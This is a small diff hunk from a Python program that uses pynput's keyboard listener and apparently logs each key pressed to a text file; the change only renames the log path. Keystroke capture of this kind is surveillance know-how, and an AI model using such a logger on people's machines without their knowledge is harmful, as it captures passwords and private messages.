@@ -6,7 +6,7 @@ import datetime
 
 from pynput.keyboard import Listener as KListener
 
-Log_File_Name = 'DataBase/Logs/Key_Logs.txt'
+Log_File_Name = 'db/Logs/Key_Logs.txt'
 
 
 def on_press(key):  # this function is called whenever any key is pressed and key contains the value of key pressed
